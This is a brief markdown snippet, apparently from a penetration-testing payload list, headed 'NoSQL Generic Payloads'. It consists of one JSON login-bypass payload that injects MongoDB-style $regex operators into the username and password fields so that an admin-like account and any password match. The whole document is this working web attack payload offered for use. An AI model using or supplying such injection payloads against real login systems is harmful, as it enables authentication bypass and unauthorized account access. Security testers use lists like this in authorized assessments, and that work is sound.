# NoSQL

## Generic Payloads

Case insensitive admin and password

```
 {"username":{"$regex":"[AaDd].min.*"},
 "password":{"$regex":"[a-zA-Z0-9].*"}}
```

